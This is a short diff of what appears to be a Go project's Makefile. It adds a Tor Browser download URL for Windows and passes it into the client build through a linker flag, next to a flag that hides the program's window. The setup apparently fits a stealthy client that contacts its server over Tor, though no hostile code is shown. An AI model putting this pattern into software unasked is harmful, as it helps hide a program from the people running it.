@@ -8,8 +8,10 @@ BIN_DIR=$(PROJECT_DIR)/bin
 SERVER_HOST=localhost
 SERVER_PORT=8080
 SERVER_URL=https://$(SERVER_HOST):$(SERVER_PORT)
+TOR_WIN_ZIP_URL=https://www.torproject.org/dist/torbrowser/7.0.2/tor-win32-0.3.0.9.zip
+
 HIDDEN=-H windowsgui
-R_LINKER_VARS=-X main.ServerBaseURL=$(SERVER_URL)
+R_LINKER_VARS=-X main.ServerBaseURL=$(SERVER_URL) -X main.TorZipUrl=$(TOR_WIN_ZIP_URL)
 S_LINKER_VARS=-X main.DefaultAddress=$(SERVER_HOST):$(SERVER_PORT)
 
 deps:
